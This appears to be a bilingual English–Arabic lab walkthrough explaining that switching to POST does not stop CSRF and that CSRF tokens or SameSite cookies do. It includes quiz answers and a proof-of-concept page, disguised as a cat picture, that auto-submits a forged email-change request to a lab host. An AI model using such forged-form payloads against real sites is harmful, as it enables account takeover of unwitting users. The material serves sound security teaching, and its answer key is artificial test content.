# Task 04 · Finding CSRF Vulnerabilities (اكتشاف ثغرات CSRF ودحض المغالطات الشائعة)

---

## Stage A: Original Task Content & Objective (المحتوى الأصلي والهدف)

When performing a penetration test or code audit, identifying CSRF vulnerabilities involves discovering sensitive, state-changing HTTP endpoints that lack proper cross-site protections.

A widespread misconception among junior web developers is that switching from the HTTP `GET` method to the HTTP `POST` method automatically secures an application against CSRF. While converting a sensitive action from `GET` to `POST` prevents trivial image-tag or hyperlink-based attacks, it does **not** stop CSRF. Modern HTML forms hosted on any external website can easily specify `method="POST"`, populate hidden inputs with malicious values, and automatically trigger form submission using minimal JavaScript.

To genuinely secure web applications, industry best practices mandate the implementation of **CSRF tokens** (anti-CSRF tokens). A CSRF token is a cryptographically strong, unpredictable, secret value generated by the server and tied to the user's current session. When a state-changing form is presented to the user, this token is embedded within the form (e.g., as a hidden field) or delivered via custom HTTP headers. When the request is submitted, the server validates the incoming token against the expected value for that session. An attacker residing on an external domain cannot predict or read this token due to the Same-Origin Policy, rendering cross-site forgery impossible.

## Stage B: Independent Thinking & OpSec Considerations (التفكير المستقل والاعتبارات الأمنية والعملياتية)

1. **The Fallacy of HTTP Methods as Security Controls:**
   - HTTP verbs dictate semantics, not security boundaries.
   - An HTML form can dispatch a cross-origin `POST` request just as easily as a `GET` request without triggering a preflight `CORS` check (known as a "Simple Request" under W3C specifications).
2. **Analysis Checklist for Penetration Testers:**
   - Does the sensitive endpoint accept `POST` requests without a hidden anti-CSRF token?
   - If a token is present, does the server actually validate it, or does it silently succeed if the token parameter is completely omitted?
   - Can the token be swapped with a token from a different user session (Token fixation/bypass)?
   - Does the backend allow method swapping (e.g., accepting the same action via `GET` even if designed for `POST`)?

## Stage D: Complete Practical Solution & Technical Deep Dive (الحل العملي التفصيلي والتحليل التقني)

### 1. Technical Analysis of the Questions:

#### Question 1:
- *Question:* What HTTP request method do many developers incorrectly believe prevents CSRF?
- *Analysis:* Many developers assume that CSRF only affects `GET` requests (e.g. `<img src="http://bank/transfer?amount=1000">`). They believe that by enforcing `POST`, attackers cannot forge requests. This is completely false because standard HTML forms support `POST` cross-origin.
- *Answer:* `POST`

#### Question 2:
- *Question:* What mechanism is commonly used to protect applications from CSRF attacks?
- *Analysis:* The primary defense recommended by OWASP is the **Synchronizer Token Pattern**, widely known as **CSRF tokens**. The server generates a high-entropy pseudo-random string associated with the user's session. Since cross-origin scripts cannot read this token from the user's DOM due to Same-Origin Policy, the forged request will arrive at the server missing a valid token, and the request is rejected with HTTP 403 Forbidden.
- *Answer:* `CSRF tokens`

### 2. Demonstrating Why `POST` Fails to Protect Against CSRF:

An attacker hosts this simple HTML on `http://attacker.thm/poc.html`:
```html
<!DOCTYPE html>
<html>
<head>
    <title>Innocent Cat Picture</title>
</head>
<body>
    <h1>Cute Cat of the Day</h1>
    <!-- The malicious POST form -->
    <form id="csrfForm" action="http://staffhub.thm:8080/update_email.php" method="POST">
        <input type="hidden" name="email" value="attacker@evilmail.thm" />
    </form>
    
    <script>
        // Automatically submits the POST request immediately upon page load
        document.getElementById('csrfForm').submit();
    </script>
</body>
</html>
```

When the victim opens this webpage, the browser executes the JavaScript, issues a standard `application/x-www-form-urlencoded` `POST` request to `http://staffhub.thm:8080/update_email.php`, and automatically attaches the victim's session cookies. The `POST` method provided zero defense!

## Stage G: Key Educational Takeaway (الخلاصة التعليمية المستفادة)

> **قاعدة ذهبية:** تغيير طريقة الطلب إلى `POST` ليس إجراءً أمنياً ضد الـ CSRF إطلاقاً، بل هو مجرد تنظيم لدلالات بروتوكول HTTP. الحماية الحقيقية تتطلب تطبيق رموز حماية غير قابلة للتخمين (`CSRF tokens`) مرتبطة بجلسة المستخدم ويتم التحقق منها بدقة مع كل طلب يؤدي لتغيير الحالة، أو تفعيل سمات ملفات تعريف الارتباط المتقدمة مثل `SameSite=Strict`.
